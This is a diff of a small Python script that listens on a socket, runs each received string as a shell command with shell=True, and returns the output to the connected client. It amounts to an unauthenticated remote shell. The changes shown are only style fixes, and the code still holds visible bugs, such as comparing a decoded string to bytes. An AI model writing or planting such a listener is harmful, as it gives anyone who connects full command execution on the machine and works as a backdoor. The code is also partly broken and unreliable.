@@ -11,16 +11,15 @@ client, address = socket.accept()
 print("{} connected".format(address))
 while True:
 
-
     sended = client.recv(255)
 
     cmd = sended.decode()
-    if cmd == (b''):
+    if cmd == b'':
         time.sleep(10)
-    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,)
+    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, )
 
     stdout, stderr = process.communicate()
-    if stderr == None:
+    if stderr is None:
         stderr = ""
     print(stdout, stderr)
     try:
@@ -28,8 +27,6 @@ while True:
     except:
         client.sendall(stderr)
     finally:
-        client.sendall(str.encode("Command has returned any input"))
+        client.sendall(str.encode("Command has returned any output"))
 
     pass
-
-
